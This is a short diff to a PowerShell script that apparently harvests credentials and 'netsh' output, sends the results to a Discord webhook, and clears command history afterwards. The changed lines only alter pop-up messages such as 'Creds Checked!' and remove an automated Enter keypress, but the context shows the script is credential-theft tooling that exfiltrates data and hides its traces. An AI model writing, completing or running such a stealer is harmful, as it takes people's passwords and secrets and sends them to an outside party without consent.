@@ -62,6 +62,9 @@ try {
         } catch {
             #Write-Host "Failed to send data to Discord webhook"
         }
+
+        Add-Type -AssemblyName PresentationFramework
+        [System.Windows.MessageBox]::Show('netsh checked!', 'Notification')
     }
 } catch {
     #Write-Host "An error occurred: $($_.Exception.Message)"
@@ -174,6 +177,4 @@ Clear-History
 
 # Display a message box indicating completion
 Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show('Credentials Script has finished, Next is File Tree', 'Notification')
-Start-Sleep -Milliseconds 2000  # Wait for the input
-[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save
+[System.Windows.MessageBox]::Show('Creds Checked!', 'Notification')
